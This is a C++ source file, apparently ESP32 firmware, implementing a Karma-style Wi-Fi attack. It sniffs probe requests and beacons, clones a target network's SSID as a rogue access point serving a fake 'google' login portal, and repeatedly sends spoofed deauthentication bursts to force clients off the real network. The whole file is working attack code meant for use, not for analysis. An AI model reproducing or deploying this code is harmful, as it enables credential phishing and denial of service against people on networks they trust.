#include "KarmaAttacker.h"
#include "App.h"
#include "EvilPortal.h"
#include "ConfigManager.h"
#include "Logger.h"
#include "Config.h"

KarmaAttacker* KarmaAttacker::instance_ = nullptr;

KarmaAttacker::KarmaAttacker() :
    app_(nullptr), isSniffing_(false), isAttacking_(false),
    channelHopIndex_(0), lastChannelHopTime_(0), lastDeauthTime_(0)
{
    instance_ = this;
}

void KarmaAttacker::setup(App* app) {
    app_ = app;
}

void KarmaAttacker::startSniffing() {
    if (isSniffing_) return;
    LOG(LogLevel::INFO, "KARMA", "Starting advanced sniffing.");

    sniffedNetworks_.clear();
    channelHopIndex_ = 0;
    
    app_->getWifiManager().setHardwareState(true, WifiMode::STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&packetHandlerCallback);
    
    // --- MODIFICATION: Use centralized channel array ---
    esp_wifi_set_channel(Channels::WIFI_2_4GHZ[0], WIFI_SECOND_CHAN_NONE);

    isSniffing_ = true;
    lastChannelHopTime_ = millis();
}

void KarmaAttacker::stopSniffing() {
    if (!isSniffing_) return;
    LOG(LogLevel::INFO, "KARMA", "Stopping sniffing.");
    isSniffing_ = false;
    esp_wifi_set_promiscuous(false);
}

bool KarmaAttacker::launchAttack(const SniffedNetworkInfo& target) {
    if (isAttacking_) return false;
    stopSniffing(); // Ensure sniffer is off before we start an AP

    LOG(LogLevel::INFO, "KARMA", "Launching attack on SSID: %s", target.ssid.c_str());
    currentTarget_ = target;

    // 1. Create the fake "Temptation" AP
    // Choose a channel different from the real one
    int fakeApChannel = (currentTarget_.channel == 6) ? 1 : 6;
    
    // We use the EvilTwin's underlying web server, but control the AP ourselves.
    EvilPortal& evilPortal = app_->getEvilPortal();
    evilPortal.prepareAttack();
    evilPortal.setSelectedPortal("google"); // Or your default portal

    // We need to manually start the AP part
    WiFi.softAP(currentTarget_.ssid.c_str(), nullptr, fakeApChannel);
    evilPortal.startWebServer(); // ONLY start the web/dns part of the EvilTwin

    isAttacking_ = true;
    lastDeauthTime_ = millis();
    // app_->getHardwareManager().setPerformanceMode(true);
    return true;
}

void KarmaAttacker::stopAttack() {
    if (!isAttacking_) return;
    LOG(LogLevel::INFO, "KARMA", "Stopping Karma attack.");
    
    app_->getEvilPortal().stop(); // This will stop the web/dns server
    WiFi.softAPdisconnect(true); // Manually stop our AP

    isAttacking_ = false;
    // app_->getHardwareManager().setPerformanceMode(false);
}

void KarmaAttacker::loop() {
    if (isSniffing_) {
        // --- MODIFICATION: Use configurable channel hop delay ---
        uint32_t channelHopDelay = app_->getConfigManager().getSettings().channelHopDelayMs;
        
        if (millis() - lastChannelHopTime_ > channelHopDelay) {
            lastChannelHopTime_ = millis();
            // --- MODIFICATION: Use centralized channel array and its size ---
            channelHopIndex_ = (channelHopIndex_ + 1) % Channels::WIFI_2_4GHZ_COUNT;
            esp_wifi_set_channel(Channels::WIFI_2_4GHZ[channelHopIndex_], WIFI_SECOND_CHAN_NONE);
        }
    } else if (isAttacking_) {
        app_->getEvilPortal().processDns(); // processDns from the renamed EvilPortal
        
        // --- MODIFICATION: Use configurable attack interval ---
        uint32_t deauthInterval = app_->getConfigManager().getSettings().attackCooldownMs;
        
        if (millis() - lastDeauthTime_ > deauthInterval) {
            lastDeauthTime_ = millis();
            sendDeauthPacket(currentTarget_.bssid);
        }
    }
}

// Static callback that redirects to the instance method
void KarmaAttacker::packetHandlerCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (instance_ != nullptr && type == WIFI_PKT_MGMT) {
        instance_->handlePacket(static_cast<wifi_promiscuous_pkt_t*>(buf));
    }
}

void KarmaAttacker::handlePacket(const wifi_promiscuous_pkt_t *packet) {
    // We want both Probe Requests and Beacon Frames
    const uint8_t* frame = packet->payload;
    const uint8_t subtype = (frame[0] & 0b11110000);

    std::string ssid;
    uint8_t channel = 0;
    bool isSecure = false;

    if (subtype == 0b01000000) { // Probe Request
        uint8_t ssid_length = frame[25];
        if (ssid_length > 0 && ssid_length <= 32) {
            char ssid_buf[33] = {0};
            memcpy(ssid_buf, &frame[26], ssid_length);
            ssid = ssid_buf;
        }
    } else if (subtype == 0b10000000) { // Beacon Frame
        uint8_t ssid_length = frame[37];
        if (ssid_length > 0 && ssid_length <= 32) {
             char ssid_buf[33] = {0};
            memcpy(ssid_buf, &frame[38], ssid_length);
            ssid = ssid_buf;
            
            // Check capability info field for privacy bit
            isSecure = (frame[34] & 0b00010000) != 0;
            
            // Find DS Parameter Set tag to get channel
            int pos = 36 + 2 + ssid_length;
            while (pos < packet->rx_ctrl.sig_len) {
                if (frame[pos] == 3) { // Tag 3 is DS Parameter Set
                    channel = frame[pos + 2];
                    break;
                }
                pos += frame[pos+1] + 2; // Move to next tag
            }
        }
    } else {
        return; // Not a frame we care about
    }

    if (ssid.empty()) return;

    // Update our list
    bool found = false;
    for (auto& net : sniffedNetworks_) {
        if (net.ssid == ssid) {
            found = true;
            // If this was a beacon, update the info
            if (subtype == 0b10000000) {
                memcpy(net.bssid, &frame[10], 6);
                net.channel = channel;
                net.isSecure = isSecure;
            }
            break;
        }
    }

    if (!found) {
        SniffedNetworkInfo newNet;
        newNet.ssid = ssid;
        if (subtype == 0b10000000) {
            memcpy(newNet.bssid, &frame[10], 6);
            newNet.channel = channel;
            newNet.isSecure = isSecure;
        }
        sniffedNetworks_.push_back(newNet);
    }
}

void KarmaAttacker::sendDeauthPacket(const uint8_t* targetBssid) {
    // Hop to the REAL AP's channel to send the deauth
    esp_wifi_set_channel(currentTarget_.channel, WIFI_SECOND_CHAN_NONE);

    // --- MODIFICATION: Use centralized deauth frame template ---
    uint8_t deauth_packet[sizeof(RawFrames::Mgmt::Deauth::TEMPLATE)];
    memcpy(deauth_packet, RawFrames::Mgmt::Deauth::TEMPLATE, sizeof(RawFrames::Mgmt::Deauth::TEMPLATE));
    
    memcpy(&deauth_packet[10], targetBssid, 6); // Source Address
    memcpy(&deauth_packet[16], targetBssid, 6); // BSSID
    
    // Send a burst
    for(int i=0; i<5; ++i) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        delay(1);
    }

    // Hop back to our FAKE AP's channel
    int fakeApChannel = (currentTarget_.channel == 6) ? 1 : 6;
    esp_wifi_set_channel(fakeApChannel, WIFI_SECOND_CHAN_NONE);
}


// Getters
bool KarmaAttacker::isSniffing() const { return isSniffing_; }
bool KarmaAttacker::isAttacking() const { return isAttacking_; }
const std::vector<SniffedNetworkInfo>& KarmaAttacker::getSniffedNetworks() const { return sniffedNetworks_; }
const std::string& KarmaAttacker::getCurrentTargetSsid() const { return currentTarget_.ssid; }